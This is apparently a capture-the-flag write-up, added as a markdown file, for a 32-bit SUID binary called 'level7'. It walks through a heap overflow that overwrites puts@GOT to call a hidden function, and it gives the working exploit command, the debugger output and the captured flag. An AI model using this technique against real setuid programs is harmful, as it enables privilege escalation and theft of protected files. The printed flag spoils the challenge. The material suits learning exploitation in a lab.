@@ -1,0 +1,121 @@
+# Level 7
+
+Binary: 32-bit ELF, SUID level8, dynamically linked.
+
+## Analysis
+
+### Ghidra output
+
+```c
+char c[80];   // global at 0x08049960
+
+void m(void) {
+    time_t t = time(NULL);
+    printf("%s - %d\n", c, t);   // prints global c
+}
+
+int main(int argc, char **argv) {
+    int **a = malloc(8);  a[0] = 1;  a[1] = malloc(8);
+    int **b = malloc(8);  b[0] = 2;  b[1] = malloc(8);
+
+    strcpy((char*)a[1], argv[1]);
+    strcpy((char*)b[1], argv[2]);
+
+    FILE *fp = fopen("/home/user/level8/.pass", "r");
+    fgets(c, 0x44, fp);           // flag loaded into global c
+    puts("~~");                    // called through GOT
+}
+```
+
+Key observations:
+
+1. Four heap chunks allocated: `a`, `a_str`, `b`, `b_str`.
+2. `strcpy` on both `a[1]` and `b[1]` with no bounds checking.
+3. `m()` prints the global `c`, but main never calls it.
+4. fgets reads the level8 password into `c`.
+5. `puts("~~")` is called via the GOT right before return.
+
+If I overflow `a_str`, I can reach the next chunk and overwrite `b[1]`. Then the **second** strcpy writes argv[2] to wherever b[1] now points. That gives an arbitrary-write primitive: write anything, anywhere.
+
+Plan: overwrite `b[1]` with `puts@GOT`'s address. Write `m()`'s address there. Then `puts("~~")` actually calls `m()`, which prints the flag that fgets just loaded.
+
+## Finding the pieces
+
+### Address of m
+
+```
+(gdb) info functions
+...
+0x080484f4  m
+```
+
+### puts@GOT
+
+```
+$ objdump -R level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+```
+
+### Offset from a_str to b[1]
+
+Breakpoint before the first strcpy, inspect the heap:
+
+```
+(gdb) b *0x080485a0
+(gdb) r AAAA BBBB
+(gdb) info registers eax           # eax = a_str address
+eax            0x804a018
+(gdb) x/20x $eax
+0x804a018: 0x00000000 0x00000000 0x00000000 0x00000011
+0x804a028: 0x00000002 0x0804a038 0x00000000 0x00000011
+             ↑          ↑
+            b[0]       b[1]
+```
+
+- a_str at `0x0804a018`
+- b[1] at  `0x0804a02c`
+- offset = `0x0804a02c - 0x0804a018` = `0x14` = **20 bytes**
+
+## Exploit
+
+```bash
+./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+- `argv[1]`: 20 bytes padding + `\x28\x99\x04\x08` (puts@GOT = 0x08049928)
+  - First strcpy overflows a_str, writing through chunk b's header and into b[1].
+  - b[1] now points at puts@GOT.
+- `argv[2]`: `\xf4\x84\x04\x08` (address of m = 0x080484f4)
+  - Second strcpy writes this to b[1]'s new target → puts@GOT now = address of m.
+
+`puts("~~")` calls via GOT → actually calls m() → prints c → flag.
+
+Output:
+
+```
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1776694943
+```
+
+The `- 1776694943` is the timestamp from `time(NULL)` in m's printf.
+
+Flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
+
+## Notes
+
+### Two-step arbitrary write
+
+This is a clean example of chaining heap writes:
+
+1. First strcpy: overflow → redirect the destination pointer of the second strcpy.
+2. Second strcpy: writes anywhere.
+
+It's essentially GOT overwrite without format strings, just two unchecked strcpys.
+
+### Why `puts("~~")`?
+
+puts is called through the PLT/GOT like any other libc function. The compiler emitted `call puts@plt`, which reads from `puts@GOT`. Overwriting that GOT entry hijacks every subsequent puts call in the program.
+
+### argv can't contain null bytes
+
+Command-line args are null-terminated C strings. Each address written (puts@GOT = 0x08049928, m = 0x080484f4) has no null bytes, so they pass through execve unchanged.
